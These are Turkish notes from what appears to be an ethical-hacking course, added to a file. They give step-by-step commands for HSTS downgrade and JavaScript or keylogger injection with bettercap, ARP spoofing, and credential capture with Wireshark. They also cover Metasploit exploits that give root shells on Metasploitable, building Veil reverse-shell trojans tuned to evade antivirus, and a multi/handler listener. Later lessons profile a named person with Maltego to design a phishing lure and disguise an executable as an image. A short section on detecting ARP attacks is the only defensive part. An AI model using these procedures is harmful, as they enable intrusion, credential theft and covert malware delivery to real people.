+adres çubuğuna (hedef bilgisayarın) twitter.com yazıyoruz twitter hsts kullanan bir sitedir siteyi açtığımızda 
+https olarak açıldığını görüyoruz yani saldırımız başarısız oldu hsts i kırmanın tek yolu hedef cihazımızın bu siteyi
+ https olan bir versiyonundan açmaya çalışması o da örneğin google ı açtığında http olarak açılacaktır burada başarılı oldu daha sonra
+  arama yerine twitter yazıp veya facebook yazıp 
+çıkan sonuçlara tıkladığında muhtemelen bir hata alıp https olarak girebileceği bir linke yönlendirecek o link de hsts olmadığı 
+https olduğu için downgrade işlemimiz başarılı olacaktır tabii en başta google.com 
+ı http olarak açmayı başaramazsa bu konuda yapabileceğimiz herhangi bir şey olmayacaktır bu şekilde açıldığında facebook.com olarak değil de
+ facebook.corn olacak açacaktır r ile n yan yana geldiğinde m gibi gözüktüğünden hedef dikkat etmediği sürece onun m olduğunu düşünecektir 
+eğer http ile girerse onun bilgilerini geçen seferki gibi alabiliriz 
+
+bu dersimizde saldırı yapacağımız cihazın tarayıcısında nasıl javascript çalıştırabiliriz bunu öğreneceğiz 
+bu dersimizde hedef bilgisayarın tarayıcısında seni hackledim diye bir uyarı mesajı göstereceğiz bunu yaparken yine
+ bettercap framewokünü kullanacağız js saldırısı bettercap de mitmf den daha iyi çalışıyor 
+kalimizde bir metin belgesi açıp içine alert('i hack you'); yazıp kaydedip ismini de dosyaismi.js olarak / (root) dizinine kaydediyoruz
+/usr/share/bettercap/caplets/hstshijack/hstshijac.cap i sağ tıklayıp open with leafpad diyerek leafpad ile açıyoruz 
+set hstshijack.payloads *:/usr/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*:/root/dosyaismi.js diyerek 
+keylogger.js den sonra bir virgül ve bir boşluk bıraktıktan sonra oluşturduğumuz ve root a kaydettiğimiz js dosyasının yolunu belirtiyoruz 
+bu dosyayı kaydediyoruz bettercap -iface eth0 diyerek bettercap i başlatıyoruz ardından net.probe on yapıyoruz 
+sonra set.arp.spoof.fullduplex true diyoruz ardından set arp.spoof.targets 10.0.2.4 diyoruz son olarak arp.spoof on yapıyoruz
+ hstshijack/hstshijack yazarak hsts javascriptini çalıştırıyoruz yazdıktan sonra çıkan çıktıda session info  nun hemen üstündeki satırda 
+ hstshijack.payloads satırında en sonra root daki dosyaismi.js imizin çalıştırıldığını görebiliriz yeşil renk ile ve https bir siteye 
+ girdiğimizde framework onu http e çevirip daha sonra bizim javascrip kodumuzum içindeki kodu çalıştırarak hedef bilgisayarımızın ekranına
+  i hack you yazdırdı
+
+ bu dersimizde wireshark isimli programı kullanmayı öğreneceğiz bu program ağ trafiğindeki bütün verileri incelememize olanak sağlar 
+ kalide arama kısmına wireshark yazarak ulaşabiliriz mavi köpek balığının yüzgecinin olduğu bir logosu var ya da terminalden de açabiliriz
+  bunun için wireshark yazıp entera basabiliriz  ilk açıldığında root isek root olarak kullanmayın gibi bir uyarı verebilir 
+  okaye basarak devam ediyoruz açılan bölümde hangi ağ kartından akan trafiği izlemek isteidğimizi seçiyoruz usb wifi card veya 
+  ethernet ağ kartı gibi ya da istediğimiz interface e çift tıklayıp başlatabiliriz ya da interface i seçip sol üstteki mavi yüzgeçe 
+  (start capturing packets) a basarak analize başlayabiliriz 
+ örneğin oluşturduğumuz bir trafiğin wireshark ile gözlemlemek için adres çubuğuna google.com yazıyoruz ve analiz edilen veriler arasından 
+ source ip si bizim ipmiz ve destination ip si de 8.8.8.8 (google ın dns sunucusu) olan bir bilgi görüyoruz burada standart query yani 
+ standart bir sorgu yaparak google.com u google un dns sunucusuna soruyorum hemen bir kaç aşağıdaki pakette de standart query response olarak 
+ bize açıklama kısmında google a ulaşabileceğimiz ip adresini verdiğini görüyoruz 
+ bu dersimizde ortadaki adam saldırısı yaparken ağı analiz edeceğiz öncelikle ortadaki adam olmak için bu uygulamada da bettercap kullanacağız
+  bettercap -iface eth0  diyerek başlatıyoruz net.probe on yapıyoruz sonra set arp.spoof.fullduplex true yapıyoruz daha sonra 
+  set arp.spoof.targets 10.0.2.4 yazıyoruz son olarak arp.spoof.on yaparak saldırıyı başlatıyoruz başarılı olup olmadığını 
+ hedef bilgisayarın cmd desinde arp -a yazarak modemin mac adresine ait 2 cihaz olduğunu görerek onaylayabiliriz bu uygulamada 
+ hsts i çalıştırmadık o yüzden http bir siteye girerek işlem yapmamız gerekiyor unicornitems.com u seçebiliriz bu uygulama için gidiyoruz
+  login kısmına bir kullanıcı adı ve şifre giriyoruz  daha sonra wireshark a girip sol üstteki mavi yüzgecin yanındaki kırmızı kareye basarak 
+ paket yakalamayı durduruyoruz çünkü yeterince paket oluştu ARP Protokolü tek tek ip adresleri ile mac adreslerini birbirine eşleştirmeye 
+ ve bunların da hangi cihaza ait olduğuna karar vermeye çalışır 
+ burada bir yayın bir broadcast yapıyor net.probe komutu bu işi yapıyor bizim bu analizde aradığımız veri kullanıcı adı şifre girişi 
+ bu eylemin kullandığı protokolün ismi HTTP dir 
+ bu kadar veriyi filtrelemenin bir yolu var ctrl+/ ya da üstteki simgelerin hemen altında input girebileceğimiz bir satır var uzunca üzerinde
+  apply a display filter buraya gelip http yazıp 
+ entera basarsak sadece http paketlerini verecektir tabii tek başına http filtresi de yeterli değil çünkü yine çok fazla http verisi var tabii
+  bu analiz edilen verileri de filtrelemenin bazı yolları var örneğin info kısmında POST/GET gibi bazı kavramlar var genellikle bir form yollama
+   işlemleri POST metodu ile yapılır şimdi POST metodu ile yapılan paketleri inceleyerek bulmaya çalışacağız 
+ post metodu kullanılarak oluşturulan paketleri incelemeye başlıyoruz bir tanesini seçip üzerine çift tıklıyoruz ardından bu paketin detayları
+  karşımıza çıkar bizim genelde ilgilendiğimiz kısım 
+ sondan bir önceki satır olan Hypertext Transfer Protocol bu kısmın da detalarını görüntülemek için hemen bulunduğu satırın başındaki küçük ok
+  işaretine basıyoruz yani bu kısım http ile giden ve gelen 
+ verilerin gösterildiği kısımdır detayları açıp biraz aşağı indiğimizde kullanıcı adı veya şifre gibi bir form yollandıysa burada olur peki 
+ istediğimiz veri hangi pakette bunu nasıl bulacağız 
+ üstteki seçeneklerden edit > find packet > e tıkladığımızda bir yer açılacak bu yeni açılan barın başında display filter altında String isimli
+  bir özellik var eğer bir metin arıyorsak stirng i kullanamız lazım http i bir protokol olduğu için onu başka bir yere yazdık filtrelemek için
+  ama bu sefer aramak istediğimiz şey bir paketin içindeki bir string olacak 
+ örneğin username string özelliğinin olduğu satırda en başta packet list özelliğinin seçili olduğunu görüyoruz bunu değiştirip packet details
+  yapmamız lazım packet list diyince paketin isminde aramak istediğimiz metini arıyor details dediğimide paketin detaylarını arıyor packet
+   listin hemen sağındaki kutucukta da narrow and wide ı seçmemiz gerekiyor tekrar string kısmından password u aratıyoruz 
+ eşleşen veriye çift tıklayıp detayları görüntüledikten sonra username ve password verilerinin  HTML Form Encoded Form İtem başlıkları altında
+   ilk 2 sırada yer aldığını görebiliyoruz 
+
+bu bölümde ortadaki adaml saldırısından kendimizi nasıl koruyabileceğimizi öğreneceğiz arp-a kmutunu otomatik olarak gerçekleştiren 
+ve eğer ağa arp saldırsı olursa bunu haber veren yazılımları kullanabiliriz 
+ya da wireshark dan edit>preferences>advenced kısmına arp yazıp arp.detect_request.storm kısmını TRUE yapabiliriz bu b,r arp storm u
+ (fırtınası/saldırısı) olursa bunu bana bul demek 
+wireshark dan gelen giden verilerden arp saldırısı olup olmadığını da gözlemleyebiliriz bu isteği başlatanın kim olduğu ip ve mac adresi vs
+ bilgisini edinebiliriz 
+
+bu dersimizde içinde pek çok açık barındıran zaafiyetli bir sanal makina olan metasploitable yi yükleyeceğiz ve saldırılarımızı bu cihaz
+ üzerinde yapacağız 
+metasploit penetrasyon sızma testi için kullanılan bir araçtır https://sourceforge.net/projects/metasploitable/files/latest/download sitesinden
+indirebiliriz 
+dosya .zip li indirilecek bu yüzden idnridikten sonra arşivden klasöre çıkarmamız gerekiyor 
+
+metasp ı yüklemek için virtualboxda araçlardan>yeni ye tıklıyoruz linux ubuntu 64 bit(normal bilgisayarımız 32 bit ise 32 yi seçmemiz gerekiyor)
+ seçiyoruz>
+metasploitable sanal makinesinin settings yani ayarlar kısmını açıyoruz network tabını açıyoruz NAT Network seçeneğini seçiyoruz Advanced
+ kısmından promiscuous mode dan allow all seçeneğini sçeiyoruz 
+kali linux umuz da NAT Network de olması gerekiyor çünkü daha sonra kali üzerinden bu makinaya erişeceğiz 
+ varolan bir sanal sabit disk dosyasını kullan(use an existing virtual hard disk file) diyoruz > Metasploitable.vmdk ekliyoruz (zip in içinde)
+  ram olarak 1 gb ram ayırmak yeterlidir 
+metasp kullanıcı arayüzü olan ubuntu kali veya windows gibi bir makine değilddir sunucu makinesi gibi düşünülebilir içinde bazı servisler 
+çalışıyor bizde bu servislerdeki açıkları bulup bunları hackeleyeceğiz 
+sadece bir defaya mahsus açıldığında bir login ekranı çıkar msfadmin yazıyoruz (ilk açışta ing klavye olduğu için msfadmın yazmamız lazım)
+ şifresi de msfadmin yine ıyla yazmamız lazım 
+ifconfig yaparak ip adresini öğrenip kaliyle aynı ağda olduğundan kali üzerinden buraya bağlanacağız sadece bu makineyle bir işimiz yok yani 
+metasploitable daki ip ye bazı istekler göndererek içerisinde çalışan servislerdeki açıkları öğreneceğiz bunu yapmak için de nmap i kullanacağız
+ (network mapper) nmap kalide hazır geliyor nmap yazarak kullanabiliriz terminalde nmap in bir grafik arayüzlü versiyonu var bunun ismi de
+  zenmap https://nmap.org/dist/ sitesinden en güncel olan versiyona sahip olan dosyayı indireibliriz şuan zenmap-7.91-1.noarch.rpm dosyası bu
+   dosya rpm kali linux a uygun bir uzantı değil o yüzden bunu dönüştürmemiz gerekiyor dosyaya sağ tıklayıp yeniden adlandır diyetek uzantısını
+    değiştirebiliriz (rename) ama bu dosyaya zarar verebileceğinden bunu yapmıyoruz bu dosyayı kali linux da açabileceğimiz formata getirmek
+  için alien isimli bir program yükleyeceğiz bunun için terminale apt-get install alien dpkg-dev debhelper build-essential yazıyoruz
+   (buradaki dpkg nin açılımı depackage dir paketi aç anlamına gelir)
+eğer yüklerken bir problem yaşarsak apt-get update yazıp sonra deneyebiliriz 
+daha sonra dosyayı indirdiğimiz konuma gidiyoruz terminalde cd /Downloads daha sonra alien zenmap-7.91-1.noarch.rpm yazıyoruz enter a basıyoruz
+ bu işlemi yaptıktan sonra rpm uzantılı dosyamızı 
+kali linuzda kullanabileceğimiz bir dosya biçimi olan .deb dosyasına dönüştürecek zenmap-7.91-1.noarch.deb 
+dpkg -i zenmap-7.91-1.noarch.deb yazıyoruz (bu dosyayı paketten çıkarıp kur anlamına gelir)
+daha sonra işlem bittikten sonra terminale zenmap yazarsak zenmap imiz açılır 
+metasploitable ile aynı ağa geçtikten sonra ifconfig den makinamızın ip sini öğreniyoruz ve bunu tarayıcıya yazarsak bizi o makine için
+ hazırlanmış bir siteye yönlendirir açılan sayfada pek çok bağlantı var bunlar birer websitesi,servisler bunları hacklemeye çalışacağız 
+ özellikle websitesi hackleme bölümünde ama bunun yanısıra birsürü server ve sunucu 
+bir sürü servis de çalıştırılıyor zenmap ile bunun açıklarına bakacağız o yüzden zenmap e geliyoruz üst tarafta bir input var target bölümünde
+ bu hedefimizin ip si onun ip sini buraya yazıyoruz hemen yanındaki profile bölümünde yapacağımız taramanın ne taraması olduğunu örneğin
+  ping scan (en basit tarama) quickscan (hızlı tarama) intense ( yoğun tarama ) bu taramaların çeşitli olmasının sebebi bazen sunuculara 
+  özlelikle intense yoğun taramada çok fazla istek gittiği için cihazımızdan sunucu kendisini bize bir tehdit olarak görüp 
+kapatabilir kendini bunun için de quick scan veya quick scan plus ile başlayabiliriz ondan sonra intense geçmek daha mantıklıdır
+ örneğin pingscan ile hedef cihaz hakkında öğrenebildiğimiz bilgiler sadece mac adresi oldu ip adresini zaten biliyırduk 
+ quickplus scan yaptığımızda açık olan portlar sunucunun işletim  sistemi olduğunu versiyonunu servis bilgilerini görüyoruz 
+ adını vs görüyoruz en önemlisi de portlarını ve portların versiyon bilgilerini görüyoruz bu bilgi şu yüzden önemli eğer hangi portun 
+ açık olduğunu ve o portun versiyonunun ne olduğunu biliyorsak o versiyon ve o port için bir zaafiyet mevcut ise bunu kullanabiliriz demektir 
+intense scan yaptığımızda ise quickscan plus a göre daha fazla bilgi verir örneğin ft-anon satırında Anonymous ftp login allowed diyor 
+bu herhangi bir kullanıcının bir username ve şifre girmeden bu ftp (file transfer protocol) servisine giriş yapabileceği anlamına gelir 
+ssh bağlantısının açık olduğunu söylüyor bize ve ssh host-key bölümünde bize bazı anahtarlar buldu belki bu anahtarlar ile şifrelenmiş 
+ssh bağlantılarının şifresini açabiliriz smtp mail için kullanılan bir servistir 80 portu http işlemlerinin yapıldığı portumuzdur 
+mysql var bu database yani veritabanı çalıştırıldığının bir işaretidir 
+burada ftp bölümünde ftp nin versiyonu vsftpd 2.3.4 yazıyor bunu kopyalıyoruz burada bir açık var mı nasıl araştırıyoruz 
+tarayıcımızı açıyoruz google a vsftpd 2.3.4 exploit yazarak 
+https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/ linkine gidiyoruz
+rapid7 da bir exploit database i veritabanıdır açıkları kullanabiliriz burdan 
+bir terminalde zenmap çalışıyor bunu kapatmayacağız new tab diyoruz msfconsole yazıp entra basıyoruz bu komut bize metasploit aracını açıyor
+ bu araç bize bir açık bulduğumuzda bunu nasıl sömürebileceğimize dair kodlar sunuyor açıldıktan sonra 
+ use exploit/unix/ftp/vsftpd_234_backdoor komutunu yazıyoruz entera basıyoruz  
+daha sonra show options (seçenekleri göster) yaıyoruz bunu yazınca bize 2 seçenek çıkartıyor 
+biri rhost diğer rport (r = remote, anlamında hedefimizin ip adresini buraya girin anlamında)
+metaspoloit içerisinde bir seçeneği dğeiştirmek için set yazıyoruz set metasploitableninipadresi ni yazıyoruz (kodda ni yok)
+rhosts 10.0.2.9 örneğin entera basıyoruz rport 21 yazıyor metapsloit d bizim portumuz da zaten 21 di zenmap den bunu görebiliriz 
+yine de bunu değiştirmek için pratik olmasını istersek rport 21 yazıyoruz emin olmak için tekrar show options yapıp gözlemleyebiliriz 
+ardından exploit yazıp entera basarsak ve şuan karşı bilgisayarı hackledik bunu doğrulamak için pwd yazıtoruz ve
+ / çıktısını alıyoruz bu root un içinde olduğumuz anlamına gelir 
+uname -a yazıp entera basıyoruz içinde bulunduğumuz sistemin adını verir whoami çalıştıralım 
+(sistem içerisinde mevcut yetkimiz/kullanıcımız hangisi bunu verir)
+root çıktsını alıyoruz root klasörüne gitmek istiyorsak cd root yazıp gidiyoruz ls yazarak root un içinde hangi dizin ve dosyalar var 
+bunu görebiliriz cd Desktop yazarak masaüstüne gidebiliriz
+
+ bu dersimizde kullanıcı adı açığını öğreneceğiz 
+bu açık ctf ve yarışmalarda da sık sık karşımıza çıkan bir açıktır 
+açık olan portlardan 137 tcp netbios-ssn portunun açık olduğunu görüyoruz hemen devamındaki 
+samba smbd 3.x-4.x versiyonunu kopyalayıp google a samba smbd 3.x-4.x exploit yazıp aratıyoruz 
+metasploit i yapan şirket rapid7 dır  https://www.rapid7.com/db/?type=metasploit adresine gidiyoruz 
+bu sayfadaki açıklamada bu portta çalışan servis için  bir kullanıcı adı isteniliyor ancak kullanıcı adı yazmak yerine bazı özel karakterler 
+kullanarak bu inputta bazı komutlar çalıştırabiliyoruz 
+shell açan bağlantı açan komutlar çalıştırabiliriz msf > use exploit/multi/samba/usermap_script komutu ile bu modülü çalıştırabiliriz 
+tabii öncelikle terminalde msfconsole yazarak metasploit i çalıştırıyoruz 
+use exploit/multi/samba/usermap_script komutunu yazıp entera basıyoruz show options yazacağız daha sonra set rhosts 10.0.2.9 diyip 
+entera basıyoruz daha sonra exploit diyerek exploit i çalıştıraibliriz 
+whoami yazıyoruz root olduğumuzu görüyoruz uname -a yazarak içinde bulunduğumuz cihazın metasploitable olduğunu doğruluyoruz 
+daha sonra exit diyerek giriş yaptığımız cihazdan çıkıyoruz eğer çalışmaz ise ctrl+c yaparak da çıkabiliriz
+ bunu yaptıktan sonra çıkmak istediğinize emin misiniz diyecektir y/N dan birisine basarak işlemimizi tamamlayabiliriz 
+Bu derste bir veritabanı açığından faydalanarak hacklemeyi öğreneceğiz 
+örneğin açık olan portlardan 5432/tcp postgresql isimli port bir veritabanı hizmeti sunan porttur bu portun versiyonu 
+PortgreSQL DB 8.3.0 - 8.3.7 BUNU KOPYALIYORUZ tekrar google a gidip PortgreSQL DB 8.3.0 - 8.3.7 exploit diye aratıp 
+https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload/ adresine gidiyoruz açıklama kısmında görüyoruz ki
+ bu postgre versiyonunda buradaki servisler /tmp dizinini kullanıyormuş 
+tmp işletim sisteminde geçici dosyaların tutulduğu yeniden başlatıldığında silinen bazı kayıtların bilgilerin tutulduğu bir dizindir
+ bu klasörü kullanırken sharelibrary yani paylaşımlı kütüphanelerden bazı kaynaklar da kullanıyormuş bu da aslında bizim buraya
+  upload edebileceğimiz herhangi bir kodu çalıştırmamıza da olanak sağlar metasploit i açtık sonra 
+  use exploit/linux/postgres/postgres_payload komutu ile 
+modülü çalıştırabiliriz ardından show options diyip set rhosts 10.0.2.9 yazıyoruz entera basıyoruz
+ (bu sefer show opt da daha fazla seçenek çıktı bunları sor) daha sonra da exploit diyerek zaafiyeti uyguluyoruz 
+bu sefer meterpreter diye bir session (oturum) aldık bu oturum daha fazla özellik bulunduran bir oturum daha fazla işlem yapabiliriz 
+help yazarsak uygulayabileceğimiz farklı seçenekleri görebiliriz 
+örneğin webcam bile açabiliriz 
+Meterpreter, ileri düzey bir Metasploit payload tipidir. Dinamik olarak hedef bilgisayarda DLL Enjeksiyon mantığı ile çalışır. 
+Ağda, sahneleyici payloadları ve soketleri kullanarak yerel bilgisayarla haberleşir.
+ Komut geçmişi, komut tamamlama vb. kabiliyetleri bulunur. meterpreter bir kişi ile bir bağlantı kurduğumuzda 
+ o bağlantıyı daha iyi yönetebilmemiz için sağlanan bir araç içeri girdikten sonra pwd yazarak hangi konumda olduğumuzu görebiliriz
+  whoami çalıştırıp mevcut kullanıcımızın ne olduğunu görebiliriz mterpreter i aldıktan sonra bağlantı yaptığımız cihazdaki dosyaları 
+  upload veya download edebiliriz 
+bu derste kendi trojanımızı oluşturmamızı sağlayan bir framework indireceğiz ismi veil 
+veil i opt klasörünün içine kuracağız (programların kurulduğu dosya) /opt konumundadır cd /opt yapıyoruz apt -y install veil
+/usr/share/veil/config/setup.sh --force --silent kodu ile de yükleyebiliriz ama bu derste git ile çalışmayı öğrenmek için git 
+i kurarak başlayacağız
+root değilsek sudo su apt-get -y install git yazıyoruz rootsak apt-get -y install git 
+git, githubdaki işimize yarayan komutları otomatik olarak bilgisayarımıza indirmemizi sağlayan bir araç 
+github, insanların herhangi bir proje hakkında kodlarını paylaştığı bir ortam 
+git clone https://github.com/Veil-Framework/Veil.git ardından bu kodu yazıp entera basıyoruz ve kodu yüklüyoruz 
+
+cd Veil/
+./config/setup.sh --force --silent yapıyoruz 
+
+içinde trojan exe yi hedefimize yollayıp çalıştırırsak bizim belirttiğimiz ip ye bir bağlantı gider yani hedef kendi bilgisayarında
+ bize bir erişim vermiş olur 
+ve bunun farkında olmaz tabii çoğu zaman antivirüsler trojan aktivitesinde bulunan dosyalara karşı kullanıcyı uyarır ama veil antivirüsleri 
+atlatmak için bir çok yöntem uygulayarak antivürüslere yakalanmayan bir trojen oluşturur bizim için 
+
+kurulum bittikten sonra python3 Veil.py yazarak çalıştırıyoruz 
+veil i çalıştırdıktan sonra kullanabileceğimiz çeşitli komutları görüyoruz örneğin exit e basarak çıkabiliriz 
+list komutu ile kullanabileceğimiz araçların neler olduğunu listeleyebiliriz 
+update diyerek veil i güncelleyebiliriz 
+use komutu ile de spesifik bir araç ı kullanabiliriz 
+list > evesion diyoruz evasion (backdoorların,trojanlerin oluşturulduğu seçenektir)
+use 1 yazıp entera basıyoruz / back diyerek bir önceki menüye gidebiliriz, tekrar list diyoruz burada 41 adet çıktı var
+ programlama dili/ele geçireceğimiz section / hangi yöntem kullanılarak ele geçirileceği 
+örneğin rev_http yöntemi ile biz hedef cihaza bağlanmayız zararlı yüklendikten sonra o bize bağlanır (rev = reverse / tersine)
+
+bu dersimizde ilk backdoorumuzu oluşturacağız 
+kaldığımız menüden use 14 diyoruz daha sonra kendi cihazımızın ip adresini öğreniyoruz set L_HOST 10.0.2.15 ARDINDAN ENTERA BASIYORUZ 
+set L_PORT 8080 yapıyoruz birden fazla programın aynı portu kullanması olası bir çakışma oluşturabileceğinden kullanılmayan bir port seçiyoruz 
+options diyip entera basarsak değiştirdiğimiz seçenekleri tabloda görebiliriz 
+SLEEP özelliği backdoor başlamadan önce kaç saniye bekleyeceğini ayarladığımız bir ayardır 
+burada opsiyonel olan bazı ayarları değiştirmek anti-virüsleri atlatmak açısından çok daha başarılı olacaktır 
+ama biz değiştirmeden generate yazıyoruz bizden bir isim isteyecek james_newpayload diyoruz 
+ve entera bastıktan sonra backdoorumuz oluşturulacaktır 
+işlem bittikten sonra gelen çıktılar arasında executable written to satırı = dosyamızın hangi dizine oluşturulduğunu/kaydedildiğini belirtir
+
+bu dersimizde antivirüslere yakalanma riskini nasıl minimalize edebiliriz veya hiç yakalanmamayı nasıl sağlarız bunu öğreneceğiz 
+peki dosyamızdaki virüs tespit edilebilir mi bunu nasıl anlayacağız bunun için de online virus scanner siteleri var burada pek çok 
+antivirüs programı ile dosyamızı tarayabiliriz ancak bu siteler 
+genelde dosya analiz sonuçlarını ve dosya içeriklerimizi antivirüs şirketleri ile paylaştığı için google a online virus scanner 
+without result distribution yazarak bu sonuçları ve dosyaları şirketlerle paylaşmayan sieleri tercih edebilriiz 
+örneğin https://nodistribute.com/ gibi eğer bu tarz siteler çalışmaz ise sadece deneme amaçlı olarak
+ sonuçları paylaşan https://virusscan.jotti.org/ gibi sitelerde de dosyamızı deneyebiliriz 
+veilimızı tekrar baştan açıyoruz 
+list > use 1 > list > use 14 > set L_HOST 10.0.2.15 > set L_PORT 8080 > options
+ > set PROCESSORS 1 > set SLEEP 4 > generate lars_newpayload > entera basıyoruz 
+  yeni oluşan dosyamızı tekrar tarattırıyoruz ve detect sayımızın düştüğünü görüyoruz bu parametreler üzerinde daha değişik ayarlar yaparsak 
+yakalanma ihtimalimiz daha da azalır backdoorumuzu oluşturduk şimdi bunu nasıl kullanacağımızı öğreneceğiz bu derste 
+
+hedef bizim trojanımızı çalıştırırsa bizim o bilgisayara erişim kazanabilmemiz için bu bağlantıyı halihazırda bekliyor / dinliyor olmamız 
+gerekiyor bunu gerçekleştirmek için de msfconsole u kullanacağız 
+msfconsole yazıp entera basıyoruz use/exploit/multi/handler diyip entera basıyoruz bu multi-handler özelliği bizim  bir çok yerde 
+gelen bağlantıları handle etmemizi yani gelen bağlantıları manage etmemizi/yönetmemizi sağlar ama öncelikle bir payload tanımlamamız gerekiyor
+ hangi kodu kullanacağımızı tanımlamamız gerekiyor 
+set PAYLOAD windows/meterpreter/reverse_http diyip entera basıyoruz daha sonra show options yazıyoruz daha sonra set LHOST 10.0.2.15 YAZIP
+ entera basıyoruz daha sonra exploit diyoruz ve şuanda 8080 portumuza düşen bir bilgi var ise dinleyebiliriz 
+ ve bir bağlantı bulursa otomatik olarak section ımızı açacak 
+
+bu dersimizde maltego aracı ile hedefimizdeki kullanıcılar hakkında nasıl bilgi toplayabileceğimizi öğreneceğiz maltego yu kullanmak için 
+öncelikle register olmamız gerekiyor güncelleme yüklendikten sonra privacy mode options bölümünde privacy mode - stealth ise
+ maltego ile edindiğimiz bilgilerde kullandığımız sorgularımızda kendi ip adresimz yerine başka bir ip adresi 
+ile bu sorguları yaparak daha gizli bir bilgi toplama işlemi gerçekleştiririz bazen stealth modda proxy ler vs çalışmayabiliyor
+ normal modda açmak daha sağlıklı sonuçlar almamaız açısından daha iyi olur 
+sol üstte maltego nun simgesinin hemen sağında new diyerek yeni bir proje oluşturabiliriz veya ctrl+t ye basarak da kısayolla oluşturabiliriz 
+sol tarafta entity palette başlığı altında bu başlığın içinde bilgi toplamak istediğimiz bazı modüller i bulabiliriz
+ (kişiler ile ilgili bilgi toplayabiliriz,cihazlar ile ilgili bilgi toplayabiliriz,
+web siteleri ile ilgili bilgi toplayabiliriz,sosyal ağlar ile ilgili bilgi toplayabiliriz ) herhangi bir modülü boş olan beyaz alana sürükleyip
+ bırakabiliriz sağ tarafta çeşitli özellikleri gördüğümüz bir pencere mevcut alt taraftaki output alanında da mesajları göreceğiz
+  web sitesi modülünü seçmiştik üzerine tıklayıp seçtikten sonra sağ tarafta websitesi kısmında paterva yerine başka bir websitesini
+araştırabiliriz daha sonra sürüklediğimiz modülün simggesine sağ tıklayıp (veya çift ) run transform(s) dan all transforms seçeneğine tıklıyoruz 
+burada site hakkında bulabilecğeimiz bilgilerin kategorize edilmiş olduğunu görüyoruz ip adresini araştırabiliriz dns i araştırabiliriz istersek
+ all tranforms satırının en sonundaki sarı play tuşuna tıklarsak mümkün olan programın yapabileceği bütün transformları çalıştırabiliriz 
+ (sarı play tuşu = run) işlem bittikten sonra veya halihazırda devam ederken bulunan sonuçların üzerinde hızlı bir şekilde gezmek için
+  sağ üstte overwiew penceresinde hızlı bir gezinti yapabiliriz 
+
+bu dersimizde maltegodan saldırı stratejisi nasıl yapılır bunu öğreneceğiz modülleri silmek için sol tık a basılı tutup
+ silmek istediğimiz kısmı içine alacak bir alan oluşturup daha sonra sağ tık yapıp silebiliriz veya del tuşuna basarak da silebiliriz 
+sol tarafta modullerin olduğu arayüzden person modülünü seçip proje sayfamıza sürüklüyoruz sağ alttan araştırmak istediğimiz kişinin 
+name ve surname ini dolduruyoruz module sağ tık yapıp all transform diyerek 
+araştırmak istediğimiz seçenekleri görüntüleyebiliriz (e-mail adresini,telefon numarasını, twitter hesabını vb.) saldırı yapacağımız kişiyi
+ twitter dan takip etmesek bile takip ettiği ve takip edilen hesapları
+görebiliriz maltego üzerinden sağ tık yapıp to twitter friend modülünü çalıştırıyoruz çıkan sonuçları zoom in zoom out yapmak için
+ overwiew penceresinin üstünde 2 adet büyüteç var ordan işlemimizi gerçekleştirebiliriz araştırcağımız kişi atil samancıoğlu olacağını 
+ varsayarsak maltego dan onun hakkında edindiğimiz bilgiler arasında udemy var yan twitter dan udemy i takip ediyormuş bunun üzerinden 
+ bir strateji gekiştirebiliriz örneğin udemy adminlerinden miş gibi gelen bir mesaj ile til samancıoğlunun eğitim verdiği udemy hesabının
+profil resmini değiştirileceğini ve yönetim tarafından uygun görülen resmin atil samancıoğlu tarafından da beğenilip beğenilmediğini sormak 
+gibi bir strateji izleyebiliriz tabii oda ekte gönderdiğimiz resmin içerisinde bir back door bir trojan olacak 
+
+bu derste seçtiğimiz görselin içerisine backdoor veya trojen yüklemeyi veya oluşturduğumuz backdoor/trojan i resim dosyası gibi göstermeyi
+ öğrenecdğiz bunun için oluşturacağımız .exe olan trojanimizi resim olarak göstermek için bir ikon oluşturmamız lazım bunun için de
+  jpeg veya png olarak seçtiğimiz dosyayı icona dönüştürebilecek .ico yapabilecek bir converter siteye ihtiyacımız var
+   https://image.online-convert.com/ sitesini kullanabiliriz bunun için 
+
+bu dersimizde oluşturduğumuz icon dosyasını .exe nin ikonu olarak nasıl ayarlanacağını öğrenelim 
+
+öncelikle cd Veil python3 Veil.py diyerek veil ı çalıştırıyoruz use 1 > list > use 7 > Set LHOST (KENDİİPADRESİMİZ) adımlarını takip ediyoruz 
+daha sonra generate yazarak trojani oluşturuyoruz adını da mynewpayload yapıyoruz LPORT u değiştirmekdik çünkü tcp bağlantısı yaptığı için 
+otomatik oalrak 4444 olarak ayarladı toolumuz trojanimizi de /var/lib/veil/output/compiled yoluna kaydediyor/oluşturuyor 
+bu dosyamızı cut/ctrl+x/kes yapıp /var/www/html/backdoors/ klasörüne yapıştırıyoruz yani aslında kendi webserverımızın içerisinde koymuş 
+olacağız tabii bu uygulamada biz kendi web serverımız üzerinden bu zararlıyı bulaştıracağız ama hackerlar bunu genelde zipleyip/sıkıştırıp mail
+ yoluyla atarlar ya da bir upload hizmet sunan bir siteye yükleyip oradan download ettirirler
+
+şimdi elimizdeki .exe dosyasının ikonunu değiştirmemiz ve oluşturduğumuz .ico doyasını .exe nin ikonu yapmamız gerekiyor bunun için
+ bir tool kullanacağız linki https://github.com/z00z/TrojanFactory öncelikle autoit isimli bir programı kali linuxumuza kurmamız gerekiyor 
+ https://www.autoitscript.com/site/autoit/downloads/ linkinden download autoit bölümünden .exe uzantılı dosyayı indiriyoruz 
+wine isimli başka bir tool kullanarak .exe dosyalarını linuxda açabiliriz terminalde wine dosya-ismi.exe diyerek istediğimiz dosyayı bu şekilde 
+çalıştırabiliriz default ayarlarda next > next yaparak yüklüyoruz daha sonra terminale gelip cd /opt yapıyoruz
+ git clone https://github.com/z00z/TrojanFactory.git komutunu yazıp entera basıyoruz 
+bu komut bu linkteki bütün dosyaları bilgisayarımıza indirmemizi sağlar opt/ içerisindeyken cd TrojanFactory/ yazıyoruz 
+daha sonra python3 trojan_factory.py çalıştırıyoruz daha sonra bu toolun nasıl çalıştırıldığını öğrenmek için --help komutunu yazarak
+ kullanabileceğimiz parametreleri görüyoruz -f parametresindeki front file dediği hangi dosyayı göstermek istiyoruz 
+ (biz jpeg i göstermek istiyoruz) .jpegimiz ile .ico muzu html/backdoors/ klasörümüze yapıştırıyoruz aynı dizinde olması için 
+terminalde service apache2 çalıştırarak web sitesi servisimizi başlatıyoruz daha sonra tekrar python3 trojan_factory.py --help yazıyoruz 
